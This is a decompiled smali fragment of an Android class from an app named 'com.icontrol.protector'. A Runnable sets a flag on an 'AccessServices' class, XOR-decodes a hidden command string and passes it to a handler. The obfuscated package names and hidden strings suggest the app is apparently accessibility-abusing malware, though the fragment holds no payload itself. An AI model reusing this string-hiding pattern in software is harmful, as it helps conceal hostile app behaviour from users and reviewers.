.class Lcom/icontrol/protector/ActivityDraw$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/ActivityDraw;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/ActivityDraw;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/ActivityDraw;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/ActivityDraw$a;->e:Lcom/icontrol/protector/ActivityDraw;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->G:Ljava/lang/Boolean;

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/icontrol/protector/a;->q(Ljava/lang/String;[Ljava/lang/String;)V

    return-void

    nop

    :array_0
    .array-data 1
        0x3dt
        -0x60t
        -0x6t
        0x4ct
        0x5t
        -0x2dt
        0x72t
        -0x3bt
    .end array-data

    :array_1
    .array-data 1
        0x5bt
        -0x31t
        -0x71t
        0x3et
        0x66t
        -0x4at
        0x1bt
        -0x4ft
    .end array-data
.end method
